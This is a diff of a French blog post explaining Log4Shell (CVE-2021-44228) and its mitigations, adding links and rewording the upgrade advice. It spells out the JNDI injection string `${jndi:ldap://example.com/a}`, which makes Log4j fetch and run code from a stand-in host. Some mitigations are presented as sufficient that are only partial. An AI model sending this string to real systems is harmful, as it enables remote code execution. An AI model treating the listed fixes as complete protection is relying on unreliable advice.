@@ -5,9 +5,9 @@ Summary: Le 9 décembre 2021, la publication d'une vulnérabilité 0 day baptis
 Slug: log4j
 Keywords: sécurité
 
-Le 9 décembre 2021, la publication d'une vulnérabilité 0 day baptisée Log4Shell (CVE-2021-44228) a ébranlé le monde de la sécurité informatique, nous tacherons de comprendre son fonctionnement et comment s'en prémunir dans cet article.
+Le 9 décembre 2021, la publication d'une vulnérabilité 0 day baptisée Log4Shell ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)) a ébranlé le monde de la sécurité informatique, nous tacherons de comprendre son fonctionnement et comment s'en prémunir dans cet article.
 
-Log4j2 est une bibliothèque Java permettant de générer... des logs, c'est comme le Port-Salut, c'est écrit dessus 😉. Cette bibliothèque est très utilisée par de nombreuses entreprises, comme, pour ne citer qu'elles, Apple, Steam, Twitter, Amazon, Tesla ou encore Microsoft. Le problème est qu'une vulnérabilité a été découverte sur ce logiciel. Cette vulnérabilité était passée jusqu'alors inaperçue, le 9 décembre un utilisateur de Github, `wcc526`, interroge l'auteur d'une pull request corrigeant cette faille à propos de celle ci. S'ensuit la publication d'une CVE et d'un Proof Of Context.
+[Log4j2](https://github.com/apache/logging-log4j2) est une bibliothèque Java permettant de générer... des logs, c'est comme le Port-Salut, c'est écrit dessus 😉. Cette bibliothèque est très utilisée par de nombreuses entreprises, comme, pour ne citer qu'elles, Apple, Steam, Twitter, Amazon, Tesla ou encore Microsoft. Le problème est qu'une vulnérabilité a été découverte sur ce logiciel. Cette vulnérabilité était passée jusqu'alors inaperçue, le 9 décembre un utilisateur de Github, `wcc526`, interroge l'auteur d'une pull request corrigeant cette faille à propos de celle ci. S'ensuit la publication d'une CVE et d'un Proof Of Context.
 
 ![Message de wcc526 "Is it a security vulnerability"](/static/img/log4j/github.png)
 
@@ -15,7 +15,7 @@ Log4j2 est une bibliothèque Java permettant de générer... des logs, c'est com
 
 L'exploitation de cette vulnérabilité est triviale, une simple suite de caractères comme `${jndi:ldap://example.com/a}` permet d'obtenir une RCE (Remote Code Execution) sur le serveur distant.
 
-JNDI est l'acronyme de "Java Naming and Directory Interface", c'est une fonction de Java qui permet d'interroger des directories afin d'obtenir en retour un objet java. Un directory, c'est une sorte de base de donnée principalement utilisée en entreprise qui stocke des informations comme par exemple les utilisateurs, leurs droits, etc. On peut citer ActiveDirectory ou encore LDAP comme exemple de directory bien connu. Java, à travers JNDI, supporte le directory open source bien connu LDAP. La syntaxe `jndi:ldap://example.com/a` interroge le serveur LDAP sur le serveur example.com et va télécharger l'objet a.
+JNDI est l'acronyme de "Java Naming and Directory Interface", c'est une fonction de Java qui permet d'interroger des directories afin d'obtenir en retour un objet java. Un directory, c'est une sorte de base de donnée principalement utilisée en entreprise qui stocke des informations comme par exemple les utilisateurs, leurs droits, etc. On peut citer ActiveDirectory ou encore [LDAP](https://fr.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol) comme exemple de directory bien connu. Java, à travers JNDI, supporte le directory bien connu LDAP. La syntaxe `jndi:ldap://example.com/a` interroge le serveur LDAP sur le serveur example.com et va télécharger l'objet a.
 
 La syntaxe `${}`indique à Log4j qu'il faut évaluer ce qui est indiqué entre accolades. Par exemple, `${java:version}` renverra la version de java. Ici, `${jndi:ldap://example.com/a}` indique à Log4j d'évaluer (exécuter) l'objet présent à l'URI `ldap://example.com/a`.
 
@@ -29,7 +29,7 @@ Cette vulnérabilité est très inquiétante au vu de la facilité avec laquelle
 
 Il existe plusieurs méthodes afin de mitiger cette faille de sécurité.
 
-La première, la plus évidente, mettre à jour log4j vers la version 2.15.0 qui n'est pas vulnérable.
+La première, la plus évidente, mettre à jour log4j vers la version 2.15.0 et/ou Java vers la version 8u121 (sortie début 2017).
 
 La seconde, mettre la variable `log4j2.formatMsgNoLookups` à `True`, ceci peut être fait en ajoutant l'argument `‐Dlog4j2.formatMsgNoLookups=True` à la commande permettant de lancer l'application Java.
 
